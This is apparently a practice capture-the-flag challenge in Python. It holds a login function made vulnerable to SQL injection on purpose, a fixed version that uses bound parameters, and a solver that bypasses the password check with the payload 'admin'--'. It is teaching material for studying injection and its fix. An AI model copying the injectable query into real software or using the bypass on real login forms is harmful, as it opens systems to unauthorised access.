"""Practice web challenge: a login check that builds SQL by string formatting."""

from __future__ import annotations

import sqlite3

from ctf_writeups.practice import SolveResult

FLAG = "flag{EXAMPLE-NOT-A-SECRET-quote-your-inputs}"
_USERS = (("guest", "guest"), ("admin", "EXAMPLE-NOT-A-SECRET-admin-password"))


class LoginChallenge:
    """An in-memory user table behind a vulnerable and a fixed login function."""

    def __init__(self) -> None:
        self._db = sqlite3.connect(":memory:")
        self._db.execute("CREATE TABLE users (name TEXT PRIMARY KEY, password TEXT NOT NULL)")
        self._db.executemany("INSERT INTO users VALUES (?, ?)", _USERS)
        self.attempts = 0

    def close(self) -> None:
        """Release the database."""
        self._db.close()

    def __enter__(self) -> LoginChallenge:
        return self

    def __exit__(self, *_: object) -> None:
        self.close()

    def _greet(self, row: tuple[str] | None) -> str:
        """The page shown after a login attempt."""
        if row is None:
            return "invalid credentials"
        return f"welcome admin, here is your flag: {FLAG}" if row[0] == "admin" else f"welcome {row[0]}"

    def login(self, name: str, password: str) -> str:
        """Vulnerable on purpose: user input is pasted into the SQL text."""
        self.attempts += 1
        query = f"SELECT name FROM users WHERE name = '{name}' AND password = '{password}'"  # noqa: S608 - the challenge
        try:
            row = self._db.execute(query).fetchone()
        except sqlite3.Error:
            return "database error"
        return self._greet(row)

    def login_fixed(self, name: str, password: str) -> str:
        """The remediation: bound parameters keep input as data."""
        self.attempts += 1
        row = self._db.execute("SELECT name FROM users WHERE name = ? AND password = ?", (name, password)).fetchone()
        return self._greet(row)


def extract_flag(page: str) -> str | None:
    """The flag in a response page, if any."""
    start = page.find("flag{")
    end = page.find("}", start)
    return page[start : end + 1] if start >= 0 and end > start else None


def solve() -> SolveResult:
    """Comment out the password check with a quote and '--'."""
    with LoginChallenge() as target:
        for name, password in (("admin", "admin"), ("admin'", "x"), ("admin'--", "x")):
            flag = extract_flag(target.login(name, password))
            if flag:
                return SolveResult(flag, target.attempts)
    raise RuntimeError("login bypass failed")
